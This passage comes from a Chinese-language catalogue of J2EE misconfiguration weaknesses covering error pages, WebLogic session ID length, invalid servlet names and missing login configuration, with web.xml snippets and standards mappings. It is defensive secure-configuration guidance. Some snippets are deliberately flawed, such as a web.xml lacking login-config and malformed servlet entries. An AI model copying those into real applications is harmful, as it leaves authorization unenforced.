<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="J2EE-Misconfiguration-Incomplete-Error-Handling-throwable"><a href="#J2EE-Misconfiguration-Incomplete-Error-Handling-throwable" class="headerlink" title="J2EE Misconfiguration: Incomplete Error Handling - (throwable)"></a>J2EE Misconfiguration: Incomplete Error Handling - (throwable)</h4><h5 id="ABSTRACT-192"><a href="#ABSTRACT-192" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Web 应用程序必须针对 java.lang.Throwable 配置默认的错误页面，来处理那些未被捕获的异常，从而防止攻击者通过应用程序容器的内置错误响应来挖掘信息。</p>
<h5 id="EXPLANATION-193"><a href="#EXPLANATION-193" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当攻击者浏览网站寻找漏洞时，站点提供信息的数量是攻击成败的关键。如果应用程序向攻击者展示了堆栈踪迹，那么堆栈释放的信息将使攻击者的攻击变得轻而易举。例如，一个堆栈跟踪可能会给攻击者显示 SQL 查询字串、即使用的数据库类型以及应用程序容器的版本。攻击者可以从这些信息中找到这些组件中存在的漏洞。</p>
<p>因此，应用程序应通过配置来指定一个默认的错误页面，以保证应用程序永远不会向攻击者泄漏错误消息。处理标准 HTTP 错误代码是一种简单、有效、安全的做法；完善的配置还会定义一个用于补救的错误处理程序，来捕获应用程序可能抛出的所有异常。</p>
<h5 id="RECOMMENDATIONS-192"><a href="#RECOMMENDATIONS-192" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>Web 应用程序必须配置有默认的错误页面。您的 web.xml 文件中应当至少包含以下条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line"></span><br><span class="line">   &lt;error-code&gt;500&lt;/error-code&gt;</span><br><span class="line"></span><br><span class="line">&lt;location&gt;/error.jsp&lt;/location&gt;</span><br><span class="line"></span><br><span class="line">&lt;/error-page&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-191"><a href="#REFERENCES-191" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 7</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="J2EE-Misconfiguration-Insufficient-Session-ID-Length"><a href="#J2EE-Misconfiguration-Insufficient-Session-ID-Length" class="headerlink" title="J2EE Misconfiguration: Insufficient Session ID Length"></a>J2EE Misconfiguration: Insufficient Session ID Length</h4><h5 id="ABSTRACT-193"><a href="#ABSTRACT-193" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>会话标识符的长度应该不小于 128 比特，以防止暴力破解会话 (brute-force session guessing) 的攻击。</p>
<h5 id="EXPLANATION-194"><a href="#EXPLANATION-194" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>WebLogic 部署标识符应该指定一个长度不小于 24 字节的会话标识符。较短的会话标识符会使应用程序暴露在暴力破解会话的攻击之下。如果攻击者可以猜测出某个授权用户的会话标识符，他就能够接收到该用户的会话。接下来的内容将详细说明使用 24 字节会话标识符的深层合理性。</p>
<p>会话标识符是一个从 62 个英文或数字中产生的伪随机结果，这意味着，如果这个字符串的每一个字节都是真正随机生成的，那么它就能产生一个最大 6 比特的熵。</p>
<p>猜测有效会话标识符所需的秒数由以下方程式给定：</p>
<p>(2^B+1) / (2<em>A</em>S)</p>
<p>其中：</p>
<p>－ B 是指会话标识符中熵的比特数。</p>
<p>－ A 表示一个攻击者每秒可以尝试猜测的次数。</p>
<p>－ S 是指在任意指定时间内可供猜测的有效会话标识符数。</p>
<p>会话标识符中熵的比特数总是比总比特数要少。例如，如果会话标识符按升序给出，那么不管标识符的长度如何，在会话标识符中都有接近 0 比特的熵。假设会话标识符都是通过一个正常的随机数值源产生的，我们将能估算出会话标识符中熵的比特数是总比特数的一半。现实中这样长度的标识符是有可能存在的，虽然这一看法不免可能有些乐观。</p>
<p>如果攻击者使用由成百上千台计算机组成的僵尸网络 (botnet)，那么我们完全有理由相信他们能够完成每秒几万次的猜测。如果这个存在问题的网站规模大且受欢迎，大量的猜测行为可能在一段时间内被忽略。</p>
<p>可供猜测的有效会话标识符数的下限就是在任意指定时间内，站点上的活动客户数量。但是，任何没有注销就丢弃会话的用户行为都将增加这个数量。（这就是为什么要设置较短的非活动会话超时时间的原因之一。）</p>
<p>一个 64 比特的会话标识符假设有 32 比特的熵。对于一个大型网站，假设攻击者每秒可以尝试 1000 次猜测，并且在任意给定时间内有 10000 个有效的会话标识符。照这个假设，攻击者成功破解出一个有效会话标识符的预期时间大约在 4 分钟以内。</p>
<p>现假设有一个提供了 64 比特熵的 128 比特会话标识符。对于一个超大型网站，可供猜测的有效会话标识符有 100000 个，攻击者可能尝试进行每秒 10000 次的猜测。照这个假设，攻击者成功破解出一个有效会话标识符的预期时间将大于 292 年。</p>
<p>将比特数换算成字节数，就会得出会话标识符为 128/6，即大约 21 字节。而且，实验表明，会话标识符的前三个字节不会随机产生，这就意味着，要实现所需的 64 比特熵，我们需要将 WebLogic 配置为使用一个长度为 24 字节的会话标识符。</p>
<h5 id="RECOMMENDATIONS-193"><a href="#RECOMMENDATIONS-193" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应该使用长度不小于 24 字节的会话标识符。weblogic.xml 配置文件应包含一个如下所示的 session-descriptor 元素：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;session-descriptor&gt;</span><br><span class="line"></span><br><span class="line"> &lt;session-param&gt;</span><br><span class="line"></span><br><span class="line">   &lt;param-name&gt;IDLength&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">   &lt;param-value&gt;24&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/session-param&gt;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> &lt;/session-descriptor&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-192"><a href="#REFERENCES-192" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 6</p>
<p>[2] Standards Mapping - FIPS200 IA</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-23 Session Authenticity (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M9 Improper Session Handling</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A3 Broken Authentication and Session Management</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A7 Broken Authentication and Session Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A3 Broken Authentication and Session Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A2 Broken Authentication and Session Management</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.3</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.7</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.10</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.10</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.10</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3090 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3405 CAT I</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3405 CAT I</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3405 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3405 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3405 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3405 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Authentication (WASC-01)</p>
<h4 id="J2EE-Misconfiguration-Invalid-Servlet-Name"><a href="#J2EE-Misconfiguration-Invalid-Servlet-Name" class="headerlink" title="J2EE Misconfiguration: Invalid Servlet Name"></a>J2EE Misconfiguration: Invalid Servlet Name</h4><h5 id="ABSTRACT-194"><a href="#ABSTRACT-194" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>无效的 servlet 名称会造成用户无法正常访问所需的 Servlet。</p>
<h5 id="EXPLANATION-195"><a href="#EXPLANATION-195" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>web.xml 中缺少 servlet 名称或包含重复的 servlet 名称均为错误。每个 Servlet 都应有一个唯一的名称 (servlet-name) 及相应的映射 (servlet-mapping)。</p>
<p>例 1：以下 web.xml 中的条目显示了几个错误的 servlet 定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- No &lt;servlet-name&gt; specified: --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line"></span><br><span class="line">        &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;</span><br><span class="line"></span><br><span class="line">        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!-- Empty &lt;servlet-name&gt; node: --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line"></span><br><span class="line">        &lt;servlet-name/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;</span><br><span class="line"></span><br><span class="line">        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;!-- Duplicate &lt;servlet-name&gt; nodes: --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line"></span><br><span class="line">        &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;servlet-name&gt;Servlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;</span><br><span class="line"></span><br><span class="line">        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/servlet&gt;</span><br></pre></td></tr></table></figure>
<p>这些错误可能导致错误地拒绝访问 Servlet。</p>
<h5 id="RECOMMENDATIONS-194"><a href="#RECOMMENDATIONS-194" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用适当的相应 DTD 或架构来避免 Web 应用程序配置文件中出现无效的 servlet 名称和其他错误。</p>
<p>例 2：以下 XML 没有使用 <web-app>，而是指定一个架构进行 XML 验证。</web-app></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/j2ee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&quot; version=&quot;2.4&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>例 3：要使用 DTD 代替，请将以下代码放到 web.xml 顶端附近：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>例 4：如果无法验证 web.xml（截止到发布之时，没有适用于 Servlet Specification 2.4 的 DTD），以下代码片段显示了正确的 servlet 定义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;</span><br><span class="line"></span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/myservlet&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-193"><a href="#REFERENCES-193" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Servlet Specification 2.4</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 730</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[6] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[18] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[19] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="J2EE-Misconfiguration-Missing-Authentication-Method"><a href="#J2EE-Misconfiguration-Missing-Authentication-Method" class="headerlink" title="J2EE Misconfiguration: Missing Authentication Method"></a>J2EE Misconfiguration: Missing Authentication Method</h4><h5 id="ABSTRACT-195"><a href="#ABSTRACT-195" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>安全和授权限制在没有登录配置的情况下会失败。</p>
<h5 id="EXPLANATION-196"><a href="#EXPLANATION-196" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p><code>&lt;login-config&gt;</code> 元素用于配置用户对应用程序进行验证的方式。缺少 authentication 方法意味着应用程序不知道如何应用授权限制，因为无人可以登录。authentication 方法使用 <code>&lt;auth-method&gt;</code>标签指定，该标签是<code>&lt;login-config&gt;</code> 的子标签。</p>
<p>共有四种 authentication 方法：BASIC、FORM、DIGEST 和 CLIENT_CERT。</p>
<p>BASIC 代表 HTTP Basic 身份验证。 FORM 代表基于表单的身份验证。 DIGEST 和 BASIC 身份验证相似；但是，DIGEST 中的密码已加密。 CLIENT_CERT 要求客户端有公钥证书并使用 SSL/TLS。</p>
<p>例 1：以下配置未指定登录配置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;!-- servlet declarations --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;...&lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;!-- servlet mappings--&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;...&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;!-- security-constraints--&gt;</span><br><span class="line"></span><br><span class="line">    &lt;security-constraint&gt;...&lt;/security-constraint&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;!-- login-config goes here --&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    &lt;!-- security-roles --&gt;</span><br><span class="line"></span><br><span class="line">    &lt;security-role&gt;...&lt;/security-role&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-195"><a href="#RECOMMENDATIONS-195" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在定义授权限制时始终指定登录配置。确保 login-config 的 auth-method 设置为 BASIC、FORM、DIGEST 或 CLIENT_CERT。</p>
<p>例 2：以下配置指定了有效的登录配置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">        &lt;web-resource-name&gt;Employees Only&lt;/web-resource-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Only allow employees access&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-pattern&gt;/store/employees/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Employees only&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;role-name&gt;employee&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;user-data-constraint&gt;</span><br><span class="line"></span><br><span class="line">        &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/user-data-constraint&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-constraint&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;login-config&gt;</span><br><span class="line"></span><br><span class="line">&lt;auth-method&gt;FORM&lt;/auth-method&gt;</span><br><span class="line"></span><br><span class="line">&lt;/login-config&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-194"><a href="#REFERENCES-194" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Servlet Specification 2.4</p>
<p>[2] Sun Microsystems, Inc. Specifying an Authentication Mechanism</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 730</p>
<p>[4] Standards Mapping - FIPS200 IA</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001640 CAT II, APSC-DV-001650 CAT II, APSC-DV-001660 CAT II, APSC-DV-002400 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001640 CAT II, APSC-DV-001650 CAT II, APSC-DV-001660 CAT II, APSC-DV-002400 CAT II</p>
